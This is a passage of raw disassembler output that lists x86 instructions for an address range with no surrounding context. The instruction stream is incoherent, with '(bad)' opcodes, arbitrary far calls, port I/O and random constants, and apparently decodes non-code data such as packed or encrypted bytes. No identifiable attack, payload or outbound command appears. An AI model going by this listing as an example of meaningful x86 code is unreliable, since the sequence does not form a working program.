  41d92f:	jns    0x41d921
  41d931:	call   0xc65e:0xd4dfbf71
  41d938:	jg     0x41d918
  41d93a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d93b:	jmp    0x41d943
  41d93d:	cmp    dl,bl
  41d93f:	dec    edi
  41d940:	pop    esp
  41d941:	ds xchg edi,eax
  41d943:	push   es
  41d944:	and    BYTE PTR [edx],bh
  41d946:	xchg   ebx,eax
  41d947:	test   al,0x8b
  41d949:	(bad)  
  41d94a:	int    0x19
  41d94c:	ss std 
  41d94e:	(bad)  
  41d94f:	xchg   ecx,eax
  41d950:	or     eax,0x9bd47eac
  41d955:	ins    DWORD PTR es:[edi],dx
  41d956:	mov    al,ds:0x9189ed35
  41d95b:	xor    ebp,ecx
  41d95d:	push   edx
  41d95e:	addr16 adc eax,0x7088dcac
  41d964:	ficom  WORD PTR ss:[esi+0x6d69cc8e]
  41d96b:	rcr    DWORD PTR [eax],1
  41d96d:	rcl    DWORD PTR [ecx+0x68fb0c05],cl
  41d973:	mov    bl,BYTE PTR [eax+0x67ac593e]
  41d979:	mov    dl,BYTE PTR [edx+ecx*2]
  41d97c:	add    al,0x79
  41d97e:	sbb    al,0x25
  41d980:	pop    ecx
  41d981:	pop    esp
  41d982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d983:	call   0x9c2f4741
  41d988:	push   ebp
  41d989:	fisubr WORD PTR [ecx-0x53]
  41d98c:	js     0x41d92e
  41d98e:	imul   ebp,DWORD PTR ds:0x3a08ddff,0x5925b66
  41d998:	mul    DWORD PTR [eax]
  41d99a:	xchg   ecx,eax
  41d99b:	arpl   WORD PTR [ebx],dx
  41d99d:	out    dx,eax
  41d99e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d99f:	or     eax,0x82743f1c
  41d9a4:	mov    dh,bl
  41d9a6:	fwait
  41d9a7:	jae    0x41d92d
  41d9a9:	cmp    esi,edi
  41d9ab:	adc    ebx,DWORD PTR [esi]
  41d9ad:	add    eax,0x52b59097
  41d9b2:	fcom   QWORD PTR [esi]
  41d9b4:	or     ebx,DWORD PTR [ebx-0x14]
  41d9b7:	cdq    
  41d9b8:	imul   esp,edx,0xffffffe6
  41d9bb:	sub    eax,0xcce1e230
  41d9c0:	sahf   
  41d9c1:	jo     0x3d7e4be
  41d9c7:	fcomp  QWORD PTR [ebx-0x483eecad]
  41d9cd:	xor    al,al
  41d9cf:	mov    dl,dl
  41d9d1:	sbb    edi,DWORD PTR [esi+0x6a099b32]
  41d9d7:	daa    
  41d9d8:	stos   DWORD PTR es:[edi],eax
  41d9d9:	jnp    0x41d9cf
  41d9db:	nop
  41d9dc:	pushf  
  41d9dd:	in     eax,0xb0
  41d9df:	jbe    0x41d9ac
  41d9e1:	mov    ds:0x7cb2597,al
  41d9e6:	ret    0xac49
  41d9e9:	inc    eax
  41d9ea:	mov    al,ds:0xe273b200
  41d9ef:	call   0xde96:0xb40d2db9
  41d9f6:	retf   0x200f
  41d9f9:	test   DWORD PTR ds:0x28ecdc3f,0x30225882
  41da03:	or     edi,esi
  41da05:	mov    bh,0x8f
  41da07:	stc    
  41da08:	test   eax,0xeec89c45
  41da0d:	pop    ebp
  41da0e:	loop   0x41da42
  41da10:	pop    ecx
  41da11:	inc    ecx
  41da12:	xchg   edx,eax
  41da13:	(bad)  [edi]
  41da15:	mov    cs,WORD PTR [ebp+0x4a]
  41da18:	mov    bl,0x2a
  41da1a:	lahf   
  41da1b:	not    DWORD PTR [esp+esi*4-0x7564dda1]
  41da22:	cmp    ch,al
  41da24:	dec    DWORD PTR [ebp-0x2220edaf]
  41da2a:	arpl   WORD PTR [eax+0x1a],sp
  41da2d:	pop    edi
  41da2e:	pop    ecx
  41da2f:	inc    ecx
  41da30:	nop
  41da31:	cld    
  41da32:	(bad)  
  41da33:	outs   dx,BYTE PTR ds:[esi]
  41da34:	sub    ecx,DWORD PTR [bp+di+0x618c]
  41da39:	jns    0x41da7b
  41da3b:	push   ebx
  41da3c:	cmp    DWORD PTR [esi+0x1b],edi
  41da3f:	mov    esi,0x849006f7
  41da44:	pop    esi
  41da45:	mov    ebx,0xec1d6c83
  41da4a:	add    esp,DWORD PTR es:[edx]
  41da4d:	in     al,0xbe
  41da4f:	jbe    0x41da8c
  41da51:	lock cmp eax,0x90376a52
  41da57:	stos   DWORD PTR es:[edi],eax
  41da58:	mov    ds,WORD PTR [ecx-0x644901bf]
  41da5e:	inc    esi
  41da5f:	push   ecx
  41da60:	outs   dx,DWORD PTR ds:[esi]
  41da61:	sub    eax,0x7f10a9b7
  41da66:	std    
  41da67:	scas   al,BYTE PTR es:[edi]
  41da68:	scas   al,BYTE PTR es:[edi]
  41da69:	mov    cl,0x76
  41da6b:	jbe    0x41da11
  41da6d:	in     eax,0xd2
  41da6f:	(bad)  
  41da70:	aaa    
  41da71:	pop    esi
  41da72:	adc    esp,DWORD PTR [ecx+0x34]
  41da75:	mov    ah,0xe7
  41da77:	ror    edi,0xeb
  41da7a:	sub    bl,BYTE PTR [ebx+0x701d39]
  41da80:	(bad)  [ebx]
  41da82:	hlt    
  41da83:	add    DWORD PTR [edi],edx
  41da85:	mov    esi,0x441c4bae
  41da8a:	adc    BYTE PTR [ecx],cl
  41da8c:	cld    
  41da8d:	sub    ebx,ebp
  41da8f:	mov    dh,0x7f
  41da91:	pop    edx
  41da92:	cld    
  41da93:	dec    ecx
  41da94:	imul   ecx,DWORD PTR [ecx+eiz*2-0x27],0xda170d80
  41da9c:	fwait
  41da9d:	dec    eax
  41da9e:	fmul   DWORD PTR [esi-0x28]
  41daa1:	jne    0x41daea
  41daa3:	sub    ebp,DWORD PTR [esi+ebx*8]
  41daa6:	inc    edi
  41daa7:	lock fild QWORD PTR [edi+0x19be3a3a]
  41daae:	nop
  41daaf:	dec    edx
  41dab0:	pop    ds
  41dab1:	shl    ah,0x7b
  41dab4:	mov    bl,0xf8
  41dab6:	push   eax
  41dab7:	loop   0x41dad8
  41dab9:	fiadd  WORD PTR [ecx-0x5c]
  41dabc:	into   
  41dabd:	dec    edx
  41dabe:	push   0xffffffb3
  41dac0:	dec    ebx
  41dac1:	push   ebx
  41dac2:	or     BYTE PTR [eax-0x65],bl
  41dac5:	xor    ah,bl
  41dac7:	and    eax,0x1f53cea4
  41dacc:	or     bl,BYTE PTR [esi+eiz*4]
  41dacf:	inc    esp
  41dad0:	sbb    ebx,DWORD PTR [esi]
  41dad2:	mov    dl,0xca
  41dad4:	dec    edx
  41dad5:	rcl    BYTE PTR [edi],cl
  41dad7:	scas   eax,DWORD PTR es:[edi]
  41dad8:	mov    edx,0xe07e40da
  41dadd:	shr    BYTE PTR [eax],1
  41dadf:	cld    
  41dae0:	sbb    edi,ebp
  41dae2:	mov    al,ds:0xb1de914b
  41dae7:	cmp    BYTE PTR [esi-0x3021cd3f],dl
  41daed:	mov    BYTE PTR [edi+ecx*2+0x5077d4da],bl
  41daf4:	adc    al,0xde
  41daf6:	xchg   esp,eax
  41daf7:	mov    ds:0xff6b4295,eax
  41dafc:	mov    bl,0xb
  41dafe:	nop
  41daff:	hlt    
  41db00:	sti    
  41db01:	mov    edx,0x2c94bb0b
  41db06:	aad    0x49
  41db08:	cmp    BYTE PTR [edx],dl
  41db0a:	mov    ds:0x20b63aab,al
  41db0f:	popf   
  41db10:	xchg   ebp,eax
  41db11:	sbb    eax,0xe0818a9e
  41db16:	stos   BYTE PTR es:[edi],al
  41db17:	or     DWORD PTR [ebx+0x26],edx
  41db1a:	fldcw  WORD PTR [edx-0x5fb52222]
  41db20:	sub    DWORD PTR [ecx+ebx*4-0x2],edx
  41db24:	sbb    eax,0x8ec5af1a
  41db29:	cmp    dl,BYTE PTR [eax]
  41db2b:	sub    ah,bl
  41db2d:	and    ecx,DWORD PTR [ecx+0x5b]
  41db30:	cmp    eax,0xbc0fb8de
  41db35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db36:	adc    eax,0x906b82c3
  41db3b:	shl    DWORD PTR [esi+0x7d99a685],cl
  41db41:	aas    
  41db42:	scas   eax,DWORD PTR es:[edi]
  41db43:	dec    ecx
  41db44:	inc    ebp
  41db45:	pop    esi
  41db46:	mov    WORD PTR [esi-0x2e],?
  41db49:	adc    bh,BYTE PTR [eax+esi*2-0x65]
  41db4d:	push   ebx
  41db4e:	mov    ds:0x7a3d963c,al
  41db53:	cdq    
  41db54:	push   edi
  41db55:	fild   WORD PTR [esi+eiz*4]
  41db58:	setge  BYTE PTR [ecx+0x18c238f9]
  41db5f:	dec    ebp
  41db60:	test   eax,0x5404f9e6
  41db65:	inc    ebx
  41db66:	mov    edi,0x9da65b31
  41db6b:	shr    DWORD PTR [esi],cl
  41db6d:	retf   0x484e
  41db70:	ret    0x90de
  41db73:	shr    BYTE PTR [edx+eax*2+0x1e31cde0],0x52
  41db7b:	and    al,0xe8
  41db7d:	mov    WORD PTR [eax+0x1ff2f742],ss
  41db83:	adc    edi,edx
  41db85:	sub    DWORD PTR [eax],edx
  41db87:	mov    BYTE PTR [ebx],ah
  41db89:	cli    
  41db8a:	(bad)  
  41db8c:	push   eax
  41db8d:	test   DWORD PTR [edi-0x1b],ebp
  41db90:	pop    esi
  41db91:	stos   DWORD PTR es:[edi],eax
  41db92:	mov    edi,DWORD PTR [edx+0x6a]
  41db95:	fldcw  WORD PTR [ebp+0x509adb3e]
  41db9b:	test   al,0x3b
  41db9d:	push   0xffffffd1
  41db9f:	xchg   ecx,eax
  41dba0:	adc    DWORD PTR [ecx],ebp
  41dba2:	call   0xfefba9d1
  41dba7:	aam    0x9b
  41dba9:	pop    edi
  41dbaa:	inc    esp
  41dbab:	xchg   ecx,eax
  41dbac:	div    BYTE PTR [esi]
  41dbae:	mov    dl,0x37
  41dbb0:	or     dh,bl
  41dbb2:	pop    ebx
  41dbb3:	sbb    al,0x2e
  41dbb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbb6:	pop    eax
  41dbb7:	fs add eax,0x2f269fbf
  41dbbd:	fs sbb dl,cl
  41dbc0:	jnp    0x41dbcd
  41dbc2:	fwait
  41dbc3:	std    
  41dbc4:	sbb    eax,0x106fc3e9
  41dbc9:	jp     0x41db5c
  41dbcb:	xor    eax,0x21d08fb6
  41dbd0:	ins    BYTE PTR es:[edi],dx
  41dbd1:	sub    DWORD PTR [edi-0x11fdb744],0xffffffa8
  41dbd8:	pop    ebx
  41dbd9:	int3   
  41dbda:	cwde   
  41dbdb:	cmp    ebp,DWORD PTR [ebx]
  41dbdd:	jg     0x41dc08
  41dbdf:	dec    edx
  41dbe0:	pusha  
  41dbe1:	add    al,0xcc
  41dbe3:	es mov esi,0x53a802d0
  41dbe9:	sub    DWORD PTR [edi+0x4f3cc537],0x101147e7
  41dbf3:	stc    
  41dbf4:	inc    eax
  41dbf5:	out    dx,al
  41dbf6:	cmp    dh,BYTE PTR [edi]
  41dbf8:	sub    esp,ebp
  41dbfa:	fstp   st(5)
  41dbfc:	dec    edi
  41dbfd:	inc    edx
  41dbfe:	enter  0x6ea9,0xbb
  41dc02:	mov    ebx,DWORD PTR ss:[ebx-0x592eaec9]
  41dc09:	dec    BYTE PTR [edi]
  41dc0b:	xchg   esp,eax
  41dc0c:	jbe    0x41dbec
  41dc0e:	iret   
  41dc0f:	jmp    0xc3de:0x84f37db2
  41dc16:	nop
  41dc17:	lea    edi,ds:0xd8085fd4
  41dc1d:	mov    al,0xd5
  41dc1f:	sub    edi,DWORD PTR [ebx+0x1efcbf1c]
  41dc25:	xor    ebx,0x10c1900e
  41dc2b:	and    DWORD PTR [esi],esi
  41dc2d:	mov    ds:0x269bae06,al
  41dc32:	pop    ebp
  41dc33:	test   al,0x8c
  41dc35:	rcr    BYTE PTR [esi+0x68d7c8d0],1
  41dc3b:	mov    esi,0x8c6cde8b
  41dc40:	call   0x4428bfe9
  41dc45:	sub    eax,0xaab77820
  41dc4a:	sub    BYTE PTR [eax+0x1262db5b],bl
  41dc50:	jg     0x41dbd4
  41dc52:	mov    cl,BYTE PTR [edx-0x1c]
  41dc55:	dec    eax
  41dc56:	jns    0x41dc09
  41dc58:	xchg   edi,eax
  41dc59:	jg     0x41dcbc
  41dc5b:	sbb    eax,0x243e359c
  41dc60:	pop    esi
  41dc61:	push   es
  41dc62:	in     al,dx
  41dc63:	adc    eax,DWORD PTR [ebx-0x61b5b94a]
  41dc69:	mov    esp,0xa7596807
  41dc6e:	or     BYTE PTR [ebx-0x77],0x2c
  41dc72:	nop
  41dc73:	push   cs
  41dc74:	ins    BYTE PTR es:[edi],dx
  41dc75:	mov    al,0xa9
  41dc77:	mov    ecx,0x4a6c5ada
  41dc7c:	pop    esp
  41dc7d:	pop    edx
  41dc7e:	adc    al,BYTE PTR [edi]
  41dc80:	push   eax
  41dc81:	mov    ch,0x79
  41dc83:	cmp    eax,0x3a05139b
  41dc88:	sbb    al,0x0
  41dc8a:	bound  edi,QWORD PTR [eax+ecx*4]
  41dc8d:	fimul  WORD PTR [edi-0x50]
  41dc90:	mov    al,ds:0xb4a9d5c
  41dc95:	int    0x90
  41dc97:	push   eax
  41dc98:	xor    bl,BYTE PTR [eax+0x2a]
  41dc9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc9c:	out    0xf5,al
  41dc9e:	test   al,0x49
  41dca0:	push   ebp
  41dca1:	nop
  41dca2:	pop    es
  41dca3:	mov    WORD PTR [eax-0x64d2def8],cs
  41dca9:	pop    ecx
  41dcaa:	xchg   BYTE PTR [edx-0x67],ch
  41dcad:	mov    edx,DWORD PTR [ebx-0x5a263eee]
  41dcb3:	mov    ebp,0xff1ded0
  41dcb8:	fild   DWORD PTR [edi+esi*4-0x412e3241]
  41dcbf:	dec    edx
  41dcc0:	fwait
  41dcc1:	jb     0x41dcc4
  41dcc3:	cmp    eax,0x610ea000
  41dcc8:	inc    ebx
  41dcc9:	jmp    0x292d92f4
  41dcce:	adc    ebp,eax
  41dcd0:	outs   dx,DWORD PTR ds:[esi]
  41dcd1:	xchg   edx,eax
  41dcd2:	push   eax
  41dcd3:	jns    0x41dd28
  41dcd5:	inc    ebx
  41dcd6:	nop
  41dcd7:	push   ss
  41dcd8:	mov    ecx,0xaea59982
  41dcdd:	outs   dx,DWORD PTR ds:[esi]
  41dcde:	add    eax,0xffde90fa
  41dce3:	inc    ebp
  41dce4:	fucomp st(3)
  41dce6:	inc    ebx
  41dce7:	or     DWORD PTR [edi+edx*1-0x251fca70],edx
  41dcee:	loopne 0x41dd48
  41dcf0:	aaa    
  41dcf1:	out    0xcb,eax
  41dcf3:	dec    ecx
  41dcf4:	add    ch,BYTE PTR [edi]
  41dcf6:	xchg   dh,dl
  41dcf8:	jg     0x41dce5
  41dcfa:	mov    edx,0x237c9e28
  41dcff:	in     eax,0x72
  41dd01:	mov    esi,0x80dfea5f
  41dd06:	mov    ecx,0x401f0b50
  41dd0b:	fistp  DWORD PTR [edx]
  41dd0d:	scas   eax,DWORD PTR es:[edi]
  41dd0e:	dec    edi
  41dd0f:	sti    
  41dd10:	jno    0x41dd20
  41dd12:	sbb    BYTE PTR [ebp+0x1d26539b],dh
  41dd18:	add    ah,dh
  41dd1a:	lahf   
  41dd1b:	xchg   DWORD PTR [edx+0x5db3f3dd],esp
  41dd21:	mov    WORD PTR [eax+edi*8+0x6ac977b5],ds
  41dd28:	mov    ebp,0x80e73760
  41dd2d:	fstp   TBYTE PTR [ebx-0x65f7f5c7]
  41dd33:	dec    ecx
  41dd34:	push   es
  41dd35:	adc    BYTE PTR [ebx-0x72],bl
  41dd38:	in     eax,0xf4
  41dd3a:	inc    esp
  41dd3b:	btr    DWORD PTR [edx],ebx
  41dd3e:	out    dx,al
  41dd3f:	sbb    al,BYTE PTR [ecx]
  41dd41:	xor    BYTE PTR [eax-0x66e671b7],0x27
  41dd48:	imul   edi,DWORD PTR [ecx+0x1b9b6f73],0x33
  41dd4f:	cwde   
  41dd50:	sahf   
  41dd51:	pop    ebp
  41dd52:	aad    0x3d
  41dd54:	add    ebx,esi
  41dd56:	xchg   esp,eax
  41dd57:	cmp    DWORD PTR [edi],esp
  41dd59:	jmp    0x41dcee
  41dd5b:	jecxz  0x41dce4
  41dd5d:	out    dx,al
  41dd5e:	or     DWORD PTR [esi+ebx*4+0x44],esi
  41dd62:	iret   
  41dd63:	arpl   WORD PTR [edi-0x39f6330a],si
  41dd69:	jecxz  0x41dde3
  41dd6b:	dec    edx
  41dd6c:	xrelease mov BYTE PTR [ebp+0xbfe20dc],dh
  41dd73:	mov    ch,0x9b
  41dd75:	mov    edi,0x41100cd5
  41dd7a:	lods   al,BYTE PTR ds:[esi]
  41dd7b:	int3   
  41dd7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd7d:	pop    ebx
  41dd7e:	xor    DWORD PTR [edx+0x27],ecx
  41dd81:	jbe    0x41ddb0
  41dd83:	xor    al,dl
  41dd85:	add    BYTE PTR [esi+0x16a9c22],0x3e
  41dd8c:	xor    BYTE PTR [ebx+eax*2-0x1c],0x6f
  41dd91:	fild   QWORD PTR [edx+0x3a]
  41dd94:	jl     0x41dd74
  41dd96:	ret    
  41dd97:	(bad)  
  41dd98:	aas    
  41dd99:	imul   esp,DWORD PTR [eax],0x8ff2603b
  41dd9f:	push   eax
  41dda0:	add    edi,DWORD PTR [ecx-0x80]
  41dda3:	cmc    
  41dda4:	mov    edx,0xc849bb4e
  41dda9:	sti    
  41ddaa:	or     eax,0x42b90ae6
  41ddaf:	cs fwait
  41ddb1:	scas   al,BYTE PTR es:[edi]
  41ddb2:	and    DWORD PTR [ebx+0xe],0xffffffb4
  41ddb6:	xchg   DWORD PTR [eax-0x7027218c],ebx
  41ddbc:	imul   BYTE PTR [eax-0x31]
  41ddbf:	mov    al,0x7b
  41ddc1:	jmp    0xdf09:0xd0dc578f
  41ddc8:	outs   dx,BYTE PTR ds:[esi]
  41ddc9:	dec    edi
  41ddca:	xor    BYTE PTR [edx+0x41],cl
  41ddcd:	xchg   ebx,eax
  41ddce:	mov    ds:0xc030c042,al
  41ddd3:	(bad)  
  41ddd4:	fwait
  41ddd5:	mov    ebx,0xa3b634b4
  41ddda:	and    BYTE PTR [ecx+0xa49de2a],dh
  41dde0:	cwde   
  41dde1:	mov    ds:0x59bd74b6,al
  41dde6:	xchg   edx,eax
  41dde7:	or     ah,BYTE PTR [edx+0x79]
  41ddea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddeb:	xor    eax,0xba349de9
  41ddf0:	inc    ebp
  41ddf1:	push   ebp
  41ddf2:	clc    
  41ddf3:	dec    ecx
  41ddf4:	loope  0x41de55
  41ddf6:	add    cl,BYTE PTR [ebp+0x69236eee]
  41ddfc:	fwait
  41ddfd:	(bad)  
  41ddfe:	cwde   
  41ddff:	stc    
  41de00:	jg     0x41dda4
  41de02:	ss jnp 0x41de5a
  41de05:	loopne 0x41de62
  41de07:	mov    ds:0x9c1375b1,eax
  41de0c:	sbb    eax,DWORD PTR [ebx-0x1a9bfb0]
  41de12:	(bad)  
  41de13:	mov    al,ds:0x3b45be10
  41de18:	mov    edi,0x774cc8d4
  41de1d:	imul   eax,DWORD PTR [edx+0x0],0x39
  41de21:	shr    BYTE PTR [eax-0x61],cl
  41de24:	fstp   st(4)
  41de26:	jl     0x41de1c
  41de28:	fwait
  41de29:	jo     0x41ddf1
  41de2b:	pop    ebx
  41de2c:	mov    ds:0x86beb1f5,eax
  41de31:	in     al,dx
  41de32:	sub    ah,cl
  41de34:	adc    BYTE PTR gs:[eax+0x51b05d0f],dh
  41de3b:	lahf   
  41de3c:	xor    esp,DWORD PTR [ebx]
  41de3e:	mov    esp,0x9167a169
  41de43:	xchg   ebp,eax
  41de44:	out    dx,eax
  41de45:	sub    eax,0x4c6b7d1c
  41de4a:	arpl   WORD PTR [ebp-0x8],cx
  41de4d:	mov    esp,0x333de364
  41de52:	sbb    BYTE PTR [edx-0x3d],ch
  41de55:	fwait
  41de56:	or     esp,eax
  41de58:	fwait
  41de59:	dec    edi
  41de5a:	add    DWORD PTR [edi],edx
  41de5c:	mov    eax,0x34add150
  41de61:	jbe    0x41dec3
  41de63:	dec    ebp
  41de64:	cdq    
  41de65:	test   BYTE PTR [eax],cl
  41de67:	sbb    bh,bl
  41de69:	xor    BYTE PTR [eax-0x30],ah
  41de6c:	pop    ss
  41de6d:	rcl    BYTE PTR [eax+0x74fea707],1
  41de73:	mov    cl,0xd8
  41de75:	mov    dl,0x2f
  41de77:	data16 sbb al,0xab
  41de7a:	cs retf 0x6b4c
  41de7e:	add    al,dl
  41de80:	lds    ebx,FWORD PTR [ecx-0x70]
  41de83:	imul   eax,DWORD PTR [esi],0x82b688b
  41de89:	mov    bh,0xf8
  41de8b:	lds    edx,FWORD PTR [ebx-0x22]
  41de8e:	mov    esi,0x7562d039
  41de93:	gs and bh,al
  41de96:	(bad)  
  41de97:	jae    0x41dec0
  41de99:	adc    bh,BYTE PTR [esi-0x547a82c]
  41de9f:	ret    0xf9b8
  41dea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dea3:	cmp    al,0xac
  41dea5:	pop    ebp
  41dea6:	mov    cl,0x98
  41dea8:	xchg   BYTE PTR [edi],bh
  41deaa:	mov    ch,0x1e
  41deac:	fwait
  41dead:	mov    BYTE PTR [ecx+0x6b9f234b],cl
  41deb3:	mov    eax,ds:0xe5f21cf7
  41deb8:	fwait
  41deb9:	rcr    DWORD PTR [esp+edi*1-0x7f],0x14
  41debe:	call   0x8bad:0xa3299b5a
  41dec5:	ins    DWORD PTR es:[edi],dx
  41dec6:	inc    esi
  41dec7:	ds je  0x41df20
  41deca:	sbb    DWORD PTR [edx+0x23],ecx
  41decd:	enter  0x4db,0x64
  41ded1:	fwait
  41ded2:	cmc    
  41ded3:	mov    WORD PTR [ebx-0x428054ad],ds
  41ded9:	jmp    0x8c48:0xddf82111
  41dee0:	mov    ecx,ecx
  41dee2:	adc    edi,ebp
  41dee4:	adc    eax,0x910c8fef
  41dee9:	sub    BYTE PTR [eax+esi*8+0x4a018369],al
  41def0:	fisub  WORD PTR [eax+eax*2-0x1d9e504]
  41def7:	xchg   esi,eax
  41def8:	stos   BYTE PTR es:[edi],al
  41def9:	mov    cl,0xa1
  41defb:	les    ebx,FWORD PTR [edi+0x3e]
  41defe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deff:	push   edi
  41df00:	mov    dh,0x55
  41df02:	fidivr WORD PTR ds:0xacf7e2a7
  41df08:	or     BYTE PTR [edx+0x74],bh
  41df0b:	retf   0x667
  41df0e:	cmp    esp,DWORD PTR [ecx+0x57d56cda]
  41df14:	adc    ch,BYTE PTR [edx-0x44]
  41df17:	sub    eax,edi
  41df19:	int    0x37
  41df1b:	or     cl,bl
  41df1d:	fisttp QWORD PTR [ebx]
  41df1f:	xor    eax,0xffffffb3
  41df22:	jae    0x41dec0
  41df24:	sbb    al,BYTE PTR [ecx+0x32189590]
  41df2a:	shl    dh,0x64
  41df2d:	mov    ebp,0x98b34a1a
  41df32:	sti    
  41df33:	sbb    DWORD PTR ds:0x9b40ab4a,0xffffff9c
  41df3a:	jno    0x41df55
  41df3c:	ins    BYTE PTR es:[edi],dx
  41df3d:	imul   ebp,DWORD PTR [edx-0x25],0x5d
  41df41:	sbb    al,0x88
  41df43:	sub    al,0x1b
  41df45:	sbb    esi,eax
  41df47:	test   al,0x1b
  41df49:	jg     0x41df24
  41df4b:	push   0x47d50b9b
  41df50:	sbb    eax,0x4228d037
  41df55:	loopne 0x41df20
  41df57:	mov    ebp,0x9e4d2422
  41df5c:	pop    ebx
  41df5d:	ret    0xb925
  41df60:	push   ebx
  41df61:	mov    bl,0x90
  41df63:	add    DWORD PTR [edx+0x323fbd6f],esi
  41df69:	ja     0x41df9c
  41df6b:	dec    edx
  41df6c:	popa   
  41df6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df6e:	fisubr DWORD PTR [ebx-0x68]
  41df71:	pop    edi
  41df72:	and    al,bl
  41df74:	pushf  
  41df75:	nop
  41df76:	test   BYTE PTR [eax-0x2],dh
  41df79:	fiadd  WORD PTR [eax+0x16]
  41df7c:	ja     0x41dff7
  41df7e:	gs js  0x41df35
  41df81:	aas    
  41df82:	in     al,0x49
  41df84:	adc    edx,eax
  41df86:	mov    ch,0x3e
  41df88:	and    BYTE PTR ds:0xe9ef2a90,bl
  41df8e:	mov    ebx,0x4e89cfd1
  41df93:	dec    edx
  41df94:	lods   eax,DWORD PTR ds:[esi]
  41df95:	jecxz  0x41dfb2
  41df97:	mov    eax,ds:0xab920704
  41df9c:	fwait
  41df9d:	call   0xfae6:0x51812594
  41dfa4:	cld    
  41dfa5:	frstor [ebp+0x7d3d8f1a]
  41dfab:	sbb    al,0xb0
  41dfad:	(bad)  
  41dfae:	mov    esi,0x90d3eb92
  41dfb3:	push   esi
  41dfb4:	ret    
  41dfb5:	stc    
  41dfb6:	bound  ebx,QWORD PTR [edx-0x7f]
  41dfb9:	fsubrp st(4),st
  41dfbb:	inc    esp
  41dfbc:	push   esp
  41dfbd:	cmp    cl,BYTE PTR [ebp-0x6fe77586]
  41dfc3:	rcr    DWORD PTR [ecx+edx*2+0x70a11905],0xf0
  41dfcb:	dec    ecx
  41dfcc:	call   0x7c1f:0xdeefc934
  41dfd3:	push   ds
  41dfd4:	fisubr DWORD PTR [ebp+0x2f]
  41dfd7:	mov    DWORD PTR [ebx+0x5f],ebp
  41dfda:	dec    esp
  41dfdb:	sub    ebp,ebp
  41dfdd:	fadd   QWORD PTR [ebx+0x1c730ba0]
  41dfe3:	pop    eax
  41dfe4:	xor    DWORD PTR [esi],eax
  41dfe6:	adc    BYTE PTR [edx+0x5b],0x23
  41dfea:	sbb    eax,0xacb8b6ea
  41dfef:	jmp    0x41df71
  41dff1:	not    DWORD PTR [esi+0x43]
  41dff4:	sbb    esi,DWORD PTR [edi-0x452fd4b0]
  41dffa:	ror    DWORD PTR [ecx-0x21],cl
  41dffd:	jae    0x41dfd9
  41dfff:	lock cld 
  41e001:	lahf   
  41e002:	fistp  DWORD PTR [ecx+0x7c0d799c]
  41e008:	aad    0x44
  41e00a:	pop    edx
  41e00b:	sahf   
  41e00c:	cmp    DWORD PTR [eax],0xffffffe7
  41e00f:	dec    ecx
  41e010:	add    esi,edi
  41e012:	jb     0x41e024
  41e014:	fmul   QWORD PTR [edi-0x72]
  41e017:	neg    BYTE PTR [ebx-0xcabffa2]
  41e01d:	(bad)  
  41e01e:	jne    0x41dfb7
  41e020:	pop    es
  41e021:	fimul  WORD PTR [ebp+0x46]
  41e024:	loope  0x41dfe4
  41e026:	xor    eax,0xbdf0fd41
  41e02b:	icebp  
  41e02c:	mov    ebx,0x238ff2
  41e031:	pop    ecx
  41e032:	fs (bad) 
  41e034:	pop    ecx
  41e035:	loope  0x41e0a9
  41e037:	mov    edx,0xdecc4ec4
  41e03c:	sub    edx,DWORD PTR [esp+ecx*4+0x2e]
  41e040:	fcom   DWORD PTR [esi-0x45e3b412]
  41e046:	test   BYTE PTR [ebx+0x5b0a1db6],0xf2
  41e04d:	(bad)  
  41e04e:	or     cl,BYTE PTR [edx+0x3d]
  41e051:	cmp    DWORD PTR [edi-0x1c],ebx
  41e054:	gs mov bh,0xe5
  41e057:	sbb    DWORD PTR [ebx-0x6293b57b],ebx
  41e05d:	lea    ebx,[eax]
  41e05f:	push   esp
  41e060:	ficomp WORD PTR es:[edx-0x42de1e78]
  41e067:	sub    eax,0xa297ade8
  41e06c:	pop    ebp
  41e06d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e06e:	inc    edi
  41e06f:	cwde   
  41e070:	sti    
  41e071:	push   edi
  41e072:	inc    esp
  41e073:	pushf  
  41e074:	sbb    al,0xe5
  41e076:	sbb    cl,BYTE PTR [esi-0x35]
  41e079:	inc    edx
  41e07a:	je     0x41e0d0
  41e07c:	pop    eax
  41e07d:	fisubr WORD PTR [ebp+ebx*4-0x7ae4152f]
  41e084:	out    0x2d,eax
  41e086:	adc    BYTE PTR [edx-0x10],cl
  41e089:	stos   BYTE PTR es:[edi],al
  41e08a:	mov    ecx,0x1ba9c665
  41e08f:	imul   eax,DWORD PTR [eax+0x44],0x7ebf0997
  41e096:	xlat   BYTE PTR ds:[ebx]
  41e097:	push   ds
  41e098:	fsubr  DWORD PTR [edi+0x20da9c90]
  41e09e:	cs jne 0x41e0ca
  41e0a1:	setnp  BYTE PTR [ecx+0x50]
  41e0a5:	fidiv  WORD PTR ss:[edi+edx*4]
  41e0a9:	sbb    esp,ecx
  41e0ab:	cld    
  41e0ac:	fwait
  41e0ad:	or     edi,ecx
  41e0af:	adc    BYTE PTR [ecx+0x58],0xfc
  41e0b3:	adc    eax,0x3276f0bb
  41e0b8:	push   edi
  41e0b9:	fmulp  st(5),st
  41e0bb:	sbb    BYTE PTR [edi-0x4b],al
  41e0be:	push   0xffffffa1
  41e0c0:	fwait
  41e0c1:	jae    0x41e090
  41e0c3:	and    eax,0x4d0e5058
  41e0c8:	xor    ah,ch
  41e0ca:	inc    esp
  41e0cb:	jno    0x41e0d1
  41e0cd:	xor    BYTE PTR [eax+0x63],0x85
  41e0d1:	(bad)  
  41e0d2:	push   0xffffffaf
  41e0d4:	fwait
  41e0d5:	iret   
  41e0d6:	fiadd  DWORD PTR ds:0xfbbe14f8
  41e0dc:	popa   
  41e0dd:	fisub  WORD PTR [esi-0x5b318816]
  41e0e3:	cmp    al,0xde
  41e0e5:	inc    eax
  41e0e6:	jp     0x41e11a
  41e0e8:	fwait
  41e0e9:	aas    
  41e0ea:	mov    ah,0x3f
